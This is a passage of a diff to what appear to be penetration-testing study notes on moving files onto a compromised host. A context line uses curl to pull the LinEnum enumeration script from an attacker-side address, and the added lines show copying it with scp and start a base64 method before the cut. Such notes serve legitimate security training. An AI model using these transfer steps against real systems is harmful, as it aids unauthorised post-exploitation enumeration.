@@ -34,3 +34,14 @@ user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
 ## scp
 Alternatively, we can use `scp` ***if* we have ssh user credentials:***
 
+```bash
+$ scp linenum.sh user@remotehost:/tmp/linenum.sh
+
+user@remotehost's password: *********
+linenum.sh
+```
+
+> Note that we specified the local file name after `scp` and the remote directory it will be saved to after `:`.
+
+## base64
+Sometimes, we might not be able to transfer the file, 
